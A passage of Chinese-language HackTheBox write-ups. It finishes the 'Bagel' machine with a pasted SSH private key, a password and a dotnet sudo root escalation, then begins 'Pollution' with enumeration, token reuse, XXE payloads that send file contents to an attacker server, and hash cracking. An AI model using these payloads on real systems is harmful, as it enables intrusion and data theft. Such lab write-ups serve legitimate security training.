KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&quot;</span> &gt; /tmp/phil.id_rsa</span><br><span class="line">chmod 400 /tmp/phil.id_rsa</span><br><span class="line">ssh -i /tmp/phil.id_rsa phil@10.10.11.201</span><br></pre></td></tr></table></figure><p>登入SSH服务，查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phil/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3c34107a7c750f4897e23fe74a9ee2e</span><br></pre></td></tr></table></figure><h2 id="权限提升-29"><a class="markdownIt-Anchor" href="#权限提升-29"></a> 权限提升</h2><p>切至developer用户，并查看sudo权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su developer</span><br><span class="line">k8wdAYYKyhnjg3K</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for developer on bagel:</span><br><span class="line">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep&#x3D;&quot;COLORS DISPLAY</span><br><span class="line">    HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+&#x3D;&quot;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+&#x3D;&quot;LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE&quot;, env_keep+&#x3D;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;var&#x2F;lib&#x2F;snapd&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User developer may run the following commands on bagel:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;dotnet</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/dotnet fsi</span><br><span class="line">System.Diagnostics.Process.Start(<span class="string">&quot;/bin/bash&quot;</span>).WaitForExit();;</span><br></pre></td></tr></table></figure><p>获得root权限，查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d5a0583d89d813c3e82758bd9aba410d</span><br></pre></td></tr></table></figure><hr /><p>.NET json反序列化还是有点超出我的知识范围了</p><hr /><p>n1</p><h1 id="hackthebox_pollution"><a class="markdownIt-Anchor" href="#hackthebox_pollution"></a> HackTheBox_Pollution</h1><h2 id="信息收集-14"><a class="markdownIt-Anchor" href="#信息收集-14"></a> 信息收集</h2><h3 id="端口扫描-31"><a class="markdownIt-Anchor" href="#端口扫描-31"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.192</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for collect.htb (10.10.11.192)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 9997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.54 ((Debian))</span><br><span class="line">6379&#x2F;tcp open  redis   Redis key-value store</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="vhost-4"><a class="markdownIt-Anchor" href="#vhost-4"></a> VHOST</h3><p>访问<code>http://10.10.11.192</code></p><p>页面中得到域名<code>collect.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.192\tcollect.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>子域名枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;collect.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.collect.htb&quot;</span> --hl 541</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000023:   200        336 L    1220 W     14099 Ch    &quot;forum&quot;</span><br><span class="line">000002341:   401        14 L     54 W       469 Ch      &quot;developers&quot;</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.192\tforum.collect.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.192\tdevelopers.collect.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-29"><a class="markdownIt-Anchor" href="#漏洞利用-29"></a> 漏洞利用</h2><p>从链接<code>http://forum.collect.htb/attachment.php?aid=3</code>得到HTTP访问记录</p><p>得到以下纪录</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/set/role/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>collect.htb</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=r8qne20hig1k3li6prgk91t33j</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"></span><br><span class="line">token=ddac62a28254561001277727cb397baf</span><br></pre></td></tr></table></figure><p>在<code>collect.htb</code>注册并登入</p><p>使用该Token对自己在<code>collect.htb</code>对应得Session进行赋予admin角色操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://collect.htb/<span class="built_in">set</span>/role/admin -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly;&quot;</span> -d <span class="string">&quot;token=ddac62a28254561001277727cb397baf&quot;</span> -v</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 10.10.11.192:80...</span><br><span class="line">* Connected to collect.htb (10.10.11.192) port 80 (#0)</span><br><span class="line">&gt; POST &#x2F;set&#x2F;role&#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: collect.htb</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.87.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; Cookie: PHPSESSID&#x3D;Bufferfly;</span><br><span class="line">&gt; Content-Length: 38</span><br><span class="line">&gt; Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Found</span><br><span class="line">&lt; Date: Fri, 31 Mar 2023 15:27:35 GMT</span><br><span class="line">&lt; Server: Apache&#x2F;2.4.54 (Debian)</span><br><span class="line">&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">&lt; Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Location: &#x2F;admin</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host collect.htb left intact</span><br></pre></td></tr></table></figure><p>访问<code>http://collect.htb/admin</code></p><p>注册API用户的POST Data如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manage_api&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;root&gt;&lt;method&gt;POST&lt;&#x2F;method&gt;&lt;uri&gt;&#x2F;auth&#x2F;register&lt;&#x2F;uri&gt;&lt;user&gt;&lt;username&gt;a&lt;&#x2F;username&gt;&lt;password&gt;b&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>进行XXE_to_SSRF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://collect.htb/api -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly&quot;</span> -d <span class="string">&#x27;manage_api=&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://10.10.*.*/BFL&quot;&gt; %xxe; ]&gt;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.192 - - [31&#x2F;Mar&#x2F;2023 11:43:54] code 404, message File not found</span><br><span class="line">10.10.11.192 - - [31&#x2F;Mar&#x2F;2023 11:43:54] &quot;GET &#x2F;BFL HTTP&#x2F;1.1&quot; 404 -</span><br></pre></td></tr></table></figure><p>这里应该想到，Apache2服务不同于Nginx，Nginx可以通过反向代理到localhost的多个不同端口，可以使相同端口下的WEB服务，不同的域名的WEB服务可以对应不同的WEB脚本语言</p><p>而Apache2的不同域名仅是DocumentRoot不同，不会出现不同WEB脚本语言，且一般仅与PHP搭配使用</p><p>编写<code>bfl.dtd</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?BFL&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p>开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>进行XXE_to_LFI&amp;SSRF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://collect.htb/api -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly&quot;</span> -d <span class="string">&#x27;manage_api=&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://10.10.*.*/bfl.dtd&quot;&gt; %xxe;]&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>得到<code>index.php</code>的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../bootstrap.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">classes</span>\<span class="title">Routes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">classes</span>\<span class="title">Uri</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$routes</span> = [</span><br><span class="line">    <span class="string">&quot;/&quot;</span> =&gt; <span class="string">&quot;controllers/index.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/login&quot;</span> =&gt; <span class="string">&quot;controllers/login.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/register&quot;</span> =&gt; <span class="string">&quot;controllers/register.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/home&quot;</span> =&gt; <span class="string">&quot;controllers/home.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/admin&quot;</span> =&gt; <span class="string">&quot;controllers/admin.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/api&quot;</span> =&gt; <span class="string">&quot;controllers/api.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/set/role/admin&quot;</span> =&gt; <span class="string">&quot;controllers/set_role_admin.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/logout&quot;</span> =&gt; <span class="string">&quot;controllers/logout.php&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$uri</span> = Uri::load();</span><br><span class="line"><span class="keyword">require</span> Routes::load(<span class="variable">$uri</span>, <span class="variable">$routes</span>);</span><br></pre></td></tr></table></figure><p>查看<code>../bootstrap.php</code>的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.save_handler&#x27;</span>,<span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.save_path&#x27;</span>,<span class="string">&#x27;tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>/etc/passwd</code>不可读，疑似有过滤</p><p>查看<code>../../../../etc/apache2/sites-available/000-default.conf</code>的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"># The ServerName directive sets the request scheme, hostname and port that</span><br><span class="line"># the server uses to identify itself. This is used when creating</span><br><span class="line"># redirection URLs. In the context of virtual hosts, the ServerName</span><br><span class="line"># specifies what hostname must appear in the request&#39;s Host: header to</span><br><span class="line"># match this virtual host. For the default virtual host (this file) this</span><br><span class="line"># value is not decisive as it is used as a last resort host regardless.</span><br><span class="line"># However, you must set it for any further virtual host explicitly.</span><br><span class="line">#ServerName www.example.com</span><br><span class="line"></span><br><span class="line">ServerAdmin webmaster@localhost</span><br><span class="line">DocumentRoot &#x2F;var&#x2F;www&#x2F;collect&#x2F;public</span><br><span class="line"></span><br><span class="line"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line"># error, crit, alert, emerg.</span><br><span class="line"># It is also possible to configure the loglevel for particular</span><br><span class="line"># modules, e.g.</span><br><span class="line">#LogLevel info ssl:warn</span><br><span class="line"></span><br><span class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line"># For most configuration files from conf-available&#x2F;, which are</span><br><span class="line"># enabled or disabled at a global level, it is possible to</span><br><span class="line"># include a line for only one particular virtual host. For example the</span><br><span class="line"># following line enables the CGI configuration for this host only</span><br><span class="line"># after it has been globally disabled with &quot;a2disconf&quot;.</span><br><span class="line">#Include conf-available&#x2F;serve-cgi-bin.conf</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<code>000-default.conf</code>猜测<code>developers.collect.htb</code>的DocumentRoot为<code>/var/www/developers/</code></p><p>由于<code>developers.collect.htb</code>有Basic认证</p><p>尝试利用XXE读取<code>.htaccess</code>和<code>.htpasswd</code>文件</p><p><code>../../developers/.htpasswd</code>的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1</span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1600 <span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到以下凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developers_group:r0cket</span><br></pre></td></tr></table></figure><p><code>../../developers/index.php</code>的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./bootstrap.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>]) <span class="keyword">or</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] != <span class="literal">True</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(header(<span class="string">&#x27;Location: /login.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(header(<span class="string">&#x27;Location: /?page=home&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$view</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;assets/js/tailwind.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;title&gt;Developers Collect&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;flex flex-col h-screen justify-between&quot;&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;header.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line">        &lt;main class=&quot;mb-auto mx-24&quot;&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&quot;.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span 